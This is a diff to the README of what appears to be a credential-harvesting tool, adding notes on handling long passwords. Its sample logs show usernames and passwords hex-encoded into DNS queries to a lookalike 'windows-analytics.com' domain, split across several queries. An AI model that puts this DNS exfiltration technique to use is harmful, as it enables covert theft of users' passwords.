@@ -61,6 +61,16 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 [06-26-17 11:11:57] #0  173.239.230.96  INVALID testuser        somewr0ng!pa55word
 [06-26-17 11:08:11] #0  173.239.230.96  VALID   testuser        passw0rd
 ```
+ 
+# Notes
+Long passwords are also handled, example:
+``` 
+[06-27-17 11:47:39] Received 0.0.7465737475736572.54686973497341566572794C6F6E6750617373776F72645468617453686F75.de.windows-analytics.com
+[06-27-17 11:47:39] #0  173.239.230.96  VALID   testuser        ThisIsAVeryLongPasswordThatShou
+[06-27-17 11:47:39] Received 0.1.7465737475736572.6C644E6F744265496E746572727570746564496D70726F7065726C79.de.windows-analytics.com
+[06-27-17 11:47:39] #1  173.239.230.96  VALID   testuser        ldNotBeInterruptedImproperly
+```
+Probably due to DNS round-robin, DNS queries sometimes do not reach the server in the proper order. Use the first column to identify the order.
 
 # Licenses
 `dns-server.py` is a fork of https://github.com/pathes/fakedns by @pathes
